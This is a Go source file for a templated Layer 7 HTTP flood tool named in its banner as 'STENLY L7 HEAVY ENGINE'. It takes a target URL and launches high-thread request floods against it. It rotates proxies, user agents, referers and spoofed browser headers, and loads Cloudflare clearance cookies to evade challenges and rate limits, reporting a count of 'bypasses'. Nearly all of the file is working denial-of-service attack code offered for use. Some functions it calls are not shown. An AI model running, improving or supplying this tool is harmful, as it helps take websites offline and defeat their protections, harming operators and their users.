package main
import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)
var (
	targetURL      = "{{.TargetURL}}"
	attackMethod   = "{{.Method}}"
	duration       = "{{.Duration}}"
	threads        = "{{.Threads}}"
	useProxy       = "{{.UseProxy}}"
	proxyFile      = "{{.ProxyFile}}"
	rpsLimit       = "{{.RPS}}"
	customUA       = "{{.UserAgent}}"
	uaFile         = "{{.UAFile}}"
	cfClearance    = "{{.CfClearance}}"
	cfBm           = "{{.CfBm}}"
	cfSolverAPI    = "{{.CfSolverAPI}}"
	bypassHostVal  = "{{.BypassHost}}"
)
const (
	MAX_THREADS            = 50000
	REQ_POOL_SIZE          = 256
	BURST_MIN              = 1
	BURST_MAX              = 64
	MAX_PROXY_RETRIES      = 3
	PROXY_HEALTH_INTERVAL  = 10
	MIX_VECTORS_COUNT      = 8
	POOL_REBUILD_INTERVAL  = 5 * time.Second
	MAX_CONNS_PER_HOST     = 128
	DIRECT_CONNS_PER_HOST  = 256
	DNS_CACHE_TTL          = 5 * time.Minute
	CONN_WARM_COUNT        = 5
	THINK_TIME_MIN_MS      = 1
	THINK_TIME_MAX_MS      = 15
	PAGE_LOAD_CHANCE       = 3
	POOL_SIZE_FLOOD        = 64
	POOL_SIZE_POST         = 32
	POOL_SIZE_WS           = 32
	CF_CLEARANCE_TTL       = 30 * time.Minute
	CF_CHALLENGE_TIMEOUT   = 15 * time.Second
	MIX_VECTORS_COUNT_NEW  = 11
)
var (
	totalRequests uint64
	totalErrors   uint64
	total2xx      uint64
	total3xx      uint64
	total4xx      uint64
	total5xx      uint64
	totalTimeout  uint64
	totalBypass   uint64
	totalReused   uint64
	startTime     time.Time
	stopTime      time.Time
	cfg struct {
		threadCount   int
		durationSec   int
		attackType    string
		rpsPerThread  int
		useProxy      bool
		targetHost    string
		targetPort    int
		targetTLS     bool
		userAgent     string
		cfClearance   string
		cfBm          string
		cfSolverAPI   string
		bypassHost    string
	}
	httpClient *http.Client
	transport  *http.Transport
	userAgents []string
	dnsCache   sync.Map
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"application/json, text/plain, */*",
	}
	acceptLangHeaders = []string{
		"en-US,en;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
	}
	attackPaths = []string{
		"/", "/index.html", "/index.php", "/home", "/dashboard",
		"/admin", "/login", "/api", "/api/v1", "/graphql",
		"/wp-login.php", "/xmlrpc.php", "/static/", "/assets/",
		"/favicon.ico", "/robots.txt", "/search", "/product",
		"/feed", "/sitemap.xml", "/wp-json", "/wp-admin",
		"/register", "/profile", "/settings", "/checkout",
		"/cart", "/blog", "/news", "/contact", "/about",
		"/services", "/pricing", "/docs", "/help", "/support",
		"/status", "/health", "/version", "/config",
	}
	cfBypassHeaders = [][]string{
		{
			"Sec-CH-UA-Mobile", "?0",
			"Sec-CH-UA-Platform", `"Windows"`,
			"Sec-Fetch-Dest", "document",
			"Sec-Fetch-Mode", "navigate",
			"Sec-Fetch-Site", "none",
			"Sec-Fetch-User", "?1",
			"Upgrade-Insecure-Requests", "1",
			"Sec-CH-UA", `"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"`,
			"DNT", "1",
		},
		{
			"Sec-CH-UA-Mobile", "?1",
			"Sec-CH-UA-Platform", `"Android"`,
			"Sec-Fetch-Dest", "document",
			"Sec-Fetch-Mode", "navigate",
			"Sec-Fetch-Site", "none",
			"Upgrade-Insecure-Requests", "1",
			"Sec-CH-UA", `"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"`,
		},
		{
			"Sec-CH-UA-Mobile", "?0",
			"Sec-CH-UA-Platform", `"macOS"`,
			"Sec-Fetch-Dest", "empty",
			"Sec-Fetch-Mode", "cors",
			"Sec-Fetch-Site", "same-origin",
			"Sec-CH-UA", `"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"`,
		},
		{
			"Sec-CH-UA-Mobile", "?0",
			"Sec-CH-UA-Platform", `"Linux"`,
			"Sec-Fetch-Dest", "script",
			"Sec-Fetch-Mode", "no-cors",
			"Sec-Fetch-Site", "cross-site",
			"Sec-CH-UA", `"Chromium";v="131", "Not_A Brand";v="24"`,
		},
	}
	cfBypassUserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
	}
	stealthHeaders = []string{
		"X-Requested-With", "XMLHttpRequest",
		"X-CSRF-Token", "empty",
		"X-Request-ID", "",
		"X-Trace-ID", "",
		"X-Forwarded-Host", "",
		"X-Real-Port", "443",
		"Via", "1.1 google",
		"X-Forwarded-Proto", "https",
	}
	refererList = []string{
		"https://www.google.com/",
		"https://www.google.co.uk/",
		"https://www.bing.com/",
		"https://www.yahoo.com/",
		"https://duckduckgo.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.amazon.com/",
		"https://www.wikipedia.org/",
		"https://t.co/",
		"https://www.linkedin.com/",
		"https://www.instagram.com/",
	}
	mixHTTPMethods = []string{"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}
	searchTerms = []string{
		"product+review", "best+price+2024", "how+to+fix+error",
		"tutorial+guide", "download+free+version", "latest+news",
		"comparison+vs", "alternative+tool", "setup+instructions",
		"troubleshooting+guide", "api+documentation", "sample+code",
	}
	chromeVersions = []string{
		`"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"`,
		`"Chromium";v="130", "Not_A Brand";v="24", "Google Chrome";v="130"`,
		`"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		`"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"`,
		`"Not(A:Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"`,
	}
	pageResources = []string{
		"/style.css", "/main.css", "/app.css",
		"/script.js", "/main.js", "/app.js", "/vendor.js",
		"/logo.png", "/hero.jpg", "/banner.webp",
		"/font.woff2", "/icons.svg",
	}
)
func main() {
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	if cfg.useProxy {
		proxyInit()
		go refreshProxies()
		go proxyHealthChecker()
	}
	setupHTTPClient()
	loadUserAgents()
	prewarmConnections()
	printBanner()
	executeAttack()
	waitAndReport()
}
func initConfig() error {
	var err error
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 100
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	if cfg.threadCount > MAX_THREADS {
		cfg.threadCount = MAX_THREADS
	}
	cfg.attackType = strings.ToUpper(strings.TrimSpace(attackMethod))
	if cfg.attackType == "" {
		cfg.attackType = "HEAVY_GET"
	}
	rpsVal, _ := strconv.Atoi(rpsLimit)
	if rpsVal <= 0 {
		rpsVal = 0
	}
	cfg.rpsPerThread = rpsVal
	cfg.useProxy = strings.ToLower(strings.TrimSpace(useProxy)) == "true"
	cfg.userAgent = strings.TrimSpace(customUA)
	cfg.cfClearance = strings.TrimSpace(cfClearance)
	cfg.cfBm = strings.TrimSpace(cfBm)
	cfg.cfSolverAPI = strings.TrimSpace(cfSolverAPI)
	cfg.bypassHost = strings.TrimSpace(bypassHostVal)
	if cfg.cfClearance != "" {
		cfStore.Set(cfg.targetHost, cfg.cfClearance, cfg.cfBm, cfg.userAgent)
		fmt.Printf("[CF] Pre-solved cf_clearance loaded: %s...\n", cfg.cfClearance[:min(len(cfg.cfClearance), 16)])
	}
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("invalid target URL: %v", err)
	}
	cfg.targetHost = parsedURL.Hostname()
	port := parsedURL.Port()
	if port == "" {
		if parsedURL.Scheme == "https" {
			cfg.targetPort = 443
		} else {
			cfg.targetPort = 80
		}
	} else {
		cfg.targetPort, _ = strconv.Atoi(port)
	}
	cfg.targetTLS = parsedURL.Scheme == "https"
	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
	startTime = time.Now()
	return nil
}
func loadUserAgents() {
	uaPath := strings.TrimSpace(uaFile)
	if uaPath == "" {
		uaPath = "ua.txt"
	}
	file, err := os.Open(uaPath)
	if err != nil {
		userAgents = cfBypassUserAgents
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			userAgents = append(userAgents, line)
		}
	}
	if len(userAgents) == 0 {
		userAgents = cfBypassUserAgents
	}
}
func prewarmConnections() {
	if !cfg.targetTLS {
		return
	}
	fmt.Printf("[WARM] Pre-warming %d connections to %s...\n", CONN_WARM_COUNT, cfg.targetHost)
	for i := 0; i < CONN_WARM_COUNT; i++ {
		go func() {
			conn, err := tls.DialWithDialer(
				&net.Dialer{Timeout: 5 * time.Second},
				"tcp",
				fmt.Sprintf("%s:%d", cfg.targetHost, cfg.targetPort),
				getChromeTLSConfig(),
			)
			if err == nil {
				conn.Close()
			}
		}()
	}
	time.Sleep(500 * time.Millisecond)
}
func setupHTTPClient() {
	transport = &http.Transport{
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   DIRECT_CONNS_PER_HOST,
		MaxConnsPerHost:       DIRECT_CONNS_PER_HOST,
		IdleConnTimeout:       90 * time.Second,
		TLSClientConfig:       getChromeTLSConfig(),
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		TLSHandshakeTimeout:   3 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
		WriteBufferSize:       64 * 1024,
		ReadBufferSize:        64 * 1024,
	}
	httpClient = &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
		Jar: newCookieJar(),
	}
}
func newDirectClient() *http.Client {
	t := &http.Transport{
		MaxIdleConns:          500,
		MaxIdleConnsPerHost:   DIRECT_CONNS_PER_HOST,
		MaxConnsPerHost:       DIRECT_CONNS_PER_HOST,
		IdleConnTimeout:       60 * time.Second,
		TLSClientConfig:       getChromeTLSConfig(),
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		TLSHandshakeTimeout:   3 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
		WriteBufferSize:       64 * 1024,
		ReadBufferSize:        64 * 1024,
	}
	return &http.Client{
		Transport: t,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
		Jar: newCookieJar(),
	}
}
func getChromeTLSConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		ClientSessionCache: tls.NewLRUClientSessionCache(512),
		NextProtos:         []string{"h2", "http/1.1"},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
		},
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		},
	}
}
func waitAndReport() {
	ticker := time.NewTicker(3 * time.Second)
	done := make(chan bool)
	go func() {
		tickCount := 0
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				reqs := atomic.LoadUint64(&totalRequests)
				errs := atomic.LoadUint64(&totalErrors)
				to := atomic.LoadUint64(&totalTimeout)
				bp := atomic.LoadUint64(&totalBypass)
				s2xx := atomic.LoadUint64(&total2xx)
				s3xx := atomic.LoadUint64(&total3xx)
				s4xx := atomic.LoadUint64(&total4xx)
				s5xx := atomic.LoadUint64(&total5xx)
				rps := float64(reqs) / elapsed
				tickCount++
				if tickCount%5 == 0 {
					fmt.Printf("[HEAVY] %.0fs | RPS: %.0f | Req: %s | Err: %s | TO:%s\n",
						elapsed, rps, formatNum(reqs), formatNum(errs), formatNum(to))
					fmt.Printf("[STATUS] 2xx:%s 3xx:%s 4xx:%s 5xx:%s\n",
						formatNum(s2xx), formatNum(s3xx), formatNum(s4xx), formatNum(s5xx))
					fmt.Printf("[BYPASS] Rate-limit evasions: %s | Proxies alive: %d\n",
						formatNum(bp), len(proxyList))
				}
			case <-done:
				return
			}
		}
	}()
	time.Sleep(time.Until(stopTime))
	done <- true
	ticker.Stop()
	printFinalStats()
}
func printFinalStats() {
	reqs := atomic.LoadUint64(&totalRequests)
	errs := atomic.LoadUint64(&totalErrors)
	to := atomic.LoadUint64(&totalTimeout)
	bp := atomic.LoadUint64(&totalBypass)
	s2xx := atomic.LoadUint64(&total2xx)
	s3xx := atomic.LoadUint64(&total3xx)
	s4xx := atomic.LoadUint64(&total4xx)
	s5xx := atomic.LoadUint64(&total5xx)
	dur := uint64(cfg.durationSec)
	if dur == 0 {
		dur = 1
	}
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                STENLY L7 HEAVY ENGINE — FINAL STATISTICS                    ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  Total Requests:   %-20s                                    ║\n", formatNum(reqs))
	fmt.Printf("║  Average RPS:      %-20s                                    ║\n", formatNum(reqs/dur))
	fmt.Printf("║  ────────────────────────────────────────────────────────────────────────── ║\n")
	fmt.Printf("║  2xx (OK):         %-20s                                    ║\n", formatNum(s2xx))
	fmt.Printf("║  3xx (Redirect):   %-20s                                    ║\n", formatNum(s3xx))
	fmt.Printf("║  4xx (Client Err): %-20s                                    ║\n", formatNum(s4xx))
	fmt.Printf("║  5xx (Server Err): %-20s                                    ║\n", formatNum(s5xx))
	fmt.Printf("║  Timeouts:         %-20s                                    ║\n", formatNum(to))
	fmt.Printf("║  Total Errors:     %-20s                                    ║\n", formatNum(errs))
	fmt.Printf("║  Rate-Limit Bypasses: %-20s                                  ║\n", formatNum(bp))
	fmt.Printf("║  Proxy Count:      %-20d                                    ║\n", len(proxyList))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}
func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║             STENLY L7 HEAVY ENGINE v3.0 — UAM + BOT FIGHT BYPASS          ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  Target:     %-55s ║\n", targetURL)
	fmt.Printf("║  Method:     %-55s ║\n", cfg.attackType)
	fmt.Printf("║  Threads:    %-55d ║\n", cfg.threadCount)
	fmt.Printf("║  Duration:   %-55s ║\n", fmt.Sprintf("%ds", cfg.durationSec))
	fmt.Printf("║  Proxy:      %-55s ║\n", fmt.Sprintf("%v (%d loaded)", cfg.useProxy, len(proxyList)))
	fmt.Printf("║  RPS/Thread: %-55s ║\n", fmt.Sprintf("%d (0=unlimited)", cfg.rpsPerThread))
	fmt.Printf("║  Burst:      %-55s ║\n", fmt.Sprintf("%d-%d", BURST_MIN, BURST_MAX))
	fmt.Printf("║  ────────────────────────────────────────────────────────────────────────── ║\n")
	fmt.Printf("║  BYPASS:    uTLS Chrome131 | CF Challenge Solver | Rate-limit evasion       ║\n")
	fmt.Printf("║  PROXY:     Health check | Dead removal | Auto-refresh %ds                 ║\n", PROXY_HEALTH_INTERVAL)
	fmt.Printf("║  UA POOL:   %d user-agents | %d CF bypass UAs                             ║\n", len(userAgents), len(cfBypassUserAgents))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
}
